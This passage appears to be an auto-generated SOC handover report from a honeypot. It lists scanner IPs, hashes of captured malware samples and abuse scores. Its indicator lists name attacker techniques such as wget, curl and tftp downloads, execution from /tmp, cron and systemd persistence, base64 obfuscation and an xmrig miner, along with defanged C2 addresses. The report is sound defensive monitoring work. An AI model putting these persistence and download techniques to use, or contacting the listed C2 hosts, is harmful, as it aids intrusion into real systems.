| `20.40.233[.]112` | 1 | 2026-11-13 14:03 | 2026-11-13 14:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `202.137.154[.]202` | 1 | 2026-11-13 06:52 | 2026-11-13 06:52 | 9s | 0 | `T1592` | 🟢 LOW |
| `213.154.15[.]152` | 1 | 2026-11-13 05:41 | 2026-11-13 05:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-11-13 07:33 | 2026-11-13 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-11-13 14:15 | 2026-11-13 14:16 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.244.250[.]222` | 1 | 2026-11-13 04:31 | 2026-11-13 04:32 | 11s | 0 | `T1592` | 🟢 LOW |
| `216.244.250[.]222` | 1 | 2026-11-13 10:17 | 2026-11-13 10:17 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.154.214[.]92` | 1 | 2026-11-13 13:38 | 2026-11-13 13:38 | 16s | 0 | `T1592` | 🟢 LOW |
| `220.118.44[.]213` | 1 | 2026-11-13 09:17 | 2026-11-13 09:17 | 20s | 0 | `T1592` | 🟢 LOW |
| `222.113.207[.]183` | 1 | 2026-11-13 06:11 | 2026-11-13 06:12 | 25s | 0 | `T1592` | 🟢 LOW |
| `223.204.221[.]176` | 1 | 2026-11-13 16:43 | 2026-11-13 16:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.202.162[.]248` | 1 | 2026-11-13 15:26 | 2026-11-13 15:26 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.206.183[.]251` | 1 | 2026-11-13 07:33 | 2026-11-13 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.116[.]204` | 1 | 2026-11-13 07:33 | 2026-11-13 07:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.148[.]173` | 1 | 2026-11-13 03:01 | 2026-11-13 03:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.193[.]11` | 1 | 2026-11-13 07:17 | 2026-11-13 07:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.212[.]188` | 1 | 2026-11-13 06:21 | 2026-11-13 06:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.93[.]97` | 1 | 2026-11-13 05:38 | 2026-11-13 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-11-13 09:44 | 2026-11-13 09:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `40.124.186[.]168` | 1 | 2026-11-13 06:00 | 2026-11-13 06:00 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.124.186[.]171` | 1 | 2026-11-13 04:21 | 2026-11-13 04:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `41.79.18[.]87` | 1 | 2026-11-13 10:48 | 2026-11-13 10:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `41.82.57[.]155` | 1 | 2026-11-13 16:00 | 2026-11-13 16:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.103.53[.]89` | 1 | 2026-11-13 07:08 | 2026-11-13 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-13 07:04 | 2026-11-13 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-13 04:08 | 2026-11-13 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-13 16:06 | 2026-11-13 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-11-13 09:58 | 2026-11-13 09:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | 1 | 2026-11-13 15:35 | 2026-11-13 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-13 12:38 | 2026-11-13 12:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-13 15:35 | 2026-11-13 15:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.146.238[.]1` | 1 | 2026-11-13 12:10 | 2026-11-13 12:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.115.217[.]146` | 1 | 2026-11-13 11:17 | 2026-11-13 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]170` | 1 | 2026-11-13 07:43 | 2026-11-13 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]35` | 1 | 2026-11-13 12:42 | 2026-11-13 12:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.20.21[.]146` | 1 | 2026-11-13 10:43 | 2026-11-13 10:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `50.187.155[.]130` | 1 | 2026-11-13 12:09 | 2026-11-13 12:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.188.82[.]159` | 1 | 2026-11-13 05:38 | 2026-11-13 05:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `58.56.128[.]190` | 1 | 2026-11-13 10:02 | 2026-11-13 10:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `61.177.36[.]109` | 1 | 2026-11-13 07:11 | 2026-11-13 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.177.36[.]109` | 1 | 2026-11-13 12:09 | 2026-11-13 12:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.244.37[.]196` | 1 | 2026-11-13 07:19 | 2026-11-13 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]125` | 1 | 2026-11-13 07:14 | 2026-11-13 07:14 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-13 08:57 | 2026-11-13 08:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]135` | 1 | 2026-11-13 15:33 | 2026-11-13 15:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | 1 | 2026-11-13 09:32 | 2026-11-13 09:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]143` | 1 | 2026-11-13 06:31 | 2026-11-13 06:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]192` | 1 | 2026-11-13 15:35 | 2026-11-13 15:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]210` | 1 | 2026-11-13 09:33 | 2026-11-13 09:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]217` | 1 | 2026-11-13 15:34 | 2026-11-13 15:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]33` | 1 | 2026-11-13 09:39 | 2026-11-13 09:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]161` | 1 | 2026-11-13 15:33 | 2026-11-13 15:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]183` | 1 | 2026-11-13 09:31 | 2026-11-13 09:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]93` | 1 | 2026-11-13 09:32 | 2026-11-13 09:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]136` | 1 | 2026-11-13 10:31 | 2026-11-13 10:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-13 04:18 | 2026-11-13 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-13 07:59 | 2026-11-13 07:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]152` | 1 | 2026-11-13 16:11 | 2026-11-13 16:11 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.243.117[.]205` | 1 | 2026-11-13 07:13 | 2026-11-13 07:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-13 06:52 | 2026-11-13 06:52 | 7s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-13 11:19 | 2026-11-13 11:19 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-13 16:19 | 2026-11-13 16:19 | 7s | 0 | `T1592` | 🟢 LOW |
| `79.24.63[.]78` | 1 | 2026-11-13 11:30 | 2026-11-13 11:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.233.22[.]227` | 1 | 2026-11-13 11:04 | 2026-11-13 11:04 | 24s | 0 | `T1592` | 🟢 LOW |
| `84.54.70[.]36` | 1 | 2026-11-13 07:02 | 2026-11-13 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]0` | 1 | 2026-11-13 15:38 | 2026-11-13 15:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]56` | 1 | 2026-11-13 07:19 | 2026-11-13 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.253.234[.]66` | 1 | 2026-11-13 04:13 | 2026-11-13 04:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `98.116.212[.]221` | 1 | 2026-11-13 16:54 | 2026-11-13 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `98.2.224[.]101` | 1 | 2026-11-13 07:11 | 2026-11-13 07:12 | 11s | 0 | `T1592` | 🟢 LOW |
| `99.121.112[.]251` | 1 | 2026-11-13 06:39 | 2026-11-13 06:40 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.172[.]210` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `89.160.102[.]76` | SE | Bredband2 AB | **100** ⚠️ | 3 |
| `99.121.112[.]251` | US | AT&T Enterprises, LLC | **100** ⚠️ | 7 |
| `71.80.48[.]159` | US | Charter Communications LLC | **100** ⚠️ | 1 |
| `193.3.53[.]2` | US | Securitytrails, LLC | **100** ⚠️ | 24 |
| `35.206.183[.]251` | BE | Google LLC | **100** ⚠️ | 4 |
| `223.75.156[.]89` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `40.124.186[.]171` | US | Microsoft Corporation | **100** ⚠️ | 6 |
| `218.154.214[.]92` | KR | Korea Telecom | **100** ⚠️ | 3 |
| `62.220.104[.]155` | IR | Soroush Rasanheh Company Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 404 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 387 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 96 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |

---

## 🔕 False Positive Summary (67 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 27 |
| AbuseIPDB score 1 below threshold 25 | 10 |
| AbuseIPDB score 12 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 575 cases |
| Tool 34  | Credential Extractor        | ✅ 2528 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
| Tool 36  | Command Clustering          | ✅ 123 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 339 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 67 filtered (11.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 155 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 377 priority case(s) shown individually · 121 recon entry/entries in table (7 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-13T18:58:47Z_
